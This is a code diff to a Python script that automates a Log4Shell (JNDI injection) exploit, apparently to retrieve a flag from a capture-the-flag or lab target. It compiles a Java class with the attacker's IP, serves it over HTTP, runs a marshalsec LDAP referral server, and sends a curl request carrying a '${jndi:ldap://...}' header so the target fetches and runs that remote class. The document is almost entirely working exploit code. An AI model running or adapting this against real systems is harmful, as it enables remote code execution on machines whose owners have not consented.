@@ -1,3 +1,4 @@
+from pathlib import Path
 from tool.base import RunCmd, get_local_ip, match_flag, process, run_cmd
 from tool.code import java_echo
 from tool.http_server import HttpEcho, HttpFile
@@ -7,9 +8,9 @@ def run(url_base: str):
     ip = get_local_ip()
     if not ip:
         return False, "", "无法获取ip"
+
     run_cmd("mkdir -p .tmp")
     java = java_echo.replace("{{ip}}", ip).replace("{{port}}", "8000")
-
     with open(".tmp/Echo.java", "w", encoding="utf-8") as f:
         f.write(java)
 
@@ -17,45 +18,37 @@ def run(url_base: str):
     if not cr.ok:
         return False, "", cr.error
 
-    http_file = HttpFile({"Echo.class": ".tmp/Echo.class"}, 8001, verbose=True)
-    http_file.start()
+    with HttpFile({"Echo.class": Path(".tmp/Echo.class")}, port=8001), \
+         HttpEcho(port=8000) as http_echo:
 
-    text = ""
+        ldap = RunCmd(f"""
+            java -cp tool/marshalsec-0.0.3-SNAPSHOT-all.jar \
+            marshalsec.jndi.LDAPRefServer \
+            http://{ip}:8001/#Echo
+        """)
+        ok, err = ldap.run()
+        if not ok:
+            return False, "", err
 
-    def handle(body):
-        nonlocal text
-        text = body.decode(errors="ignore")
+        exp = f"curl -H 'X-Api-Version: ${{jndi:ldap://{ip}:1389/Echo}}' {url_base}/"
+        print(exp)
+        cr = run_cmd(exp)
+        print(cr.output)
+        if not cr.ok:
+            return False, "", cr.error
 
-    http_echo = HttpEcho(handle, 8000, verbose=True)
-    http_echo.start()
+        run_cmd("sleep 1")
+        ldap.stop()
 
-    cmd = f"""
-    java -cp tool/marshalsec-0.0.3-SNAPSHOT-all.jar \
-    marshalsec.jndi.LDAPRefServer \
-    http://{ip}:8001/#Echo
-    """
-    ladp = RunCmd(cmd)
-    ok, err = ladp.run()
-    if not ok:
-        return False, "", err
+        text = http_echo.echo()
 
-    exp = f"curl -H 'X-Api-Version: ${{jndi:ldap://{ip}:1389/Echo}}' {url_base}/"
-    print(exp)
-    cr = run_cmd(exp)
-    print(cr.output)
-    if not cr.ok:
-        return False, "", cr.error
+        flag = match_flag(text)
+        if not flag:
+            print(text)
+            return False, "", "flag匹配失败"
+        return True, flag, ""
 
-    run_cmd("sleep 1")
-    http_file.stop()
-    http_echo.stop()
-    ladp.stop()
 
-    flag = match_flag(text)
-    if not flag:
-        print(text)
-        return False, "", "flag匹配失败"
-    return True, flag, ""
 
 
 def main(ip_port: str):
